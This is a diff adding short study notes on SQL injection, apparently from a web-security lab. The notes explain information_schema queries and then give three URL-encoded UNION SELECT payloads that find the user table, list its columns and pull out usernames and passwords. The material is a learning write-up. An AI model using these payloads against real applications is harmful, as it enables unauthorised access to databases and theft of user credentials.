@@ -1,0 +1,33 @@
+# List the content of the databases.
+
+Most databases except Oracle have a set of views called the information schema which
+provide information about the database itself.
+
+you can query it to list all tables in the database
+
+SELECT * FROM information_schema.tables -> will return:
+TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
+MyDatabase      dbo         Users       base table    
+
+
+SELECT * FROM information_schema.columns WHERE TABLE_NAME = 'Users' -> will return:
+TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
+MyDatabase      dbo         Users     Username    varchar
+
+
+SQL Injection - Product category filter
+
+Login functionality.
+
+
+database holds a table that hold a Username and password
+db > table > Username, password
+
+Goal: determine the name of that table and columns it contains
+
+
+Process:
+'+UNION+SELECT+TABLE_NAME,+NULL+FROM+information_schema.tables-- -> users_pqzlnd
+'+UNION+SELECT+COLUMN_NAME,+NULL+FROM+information_schema.columns+WHERE+TABLE_NAME+=+'users_pqzlnd'-- -> password_tlpefp, username_uzphrd
+
+'+UNION+SELECT+username_uzphrd,+password_tlpefp+FROM+users_pqzlnd--
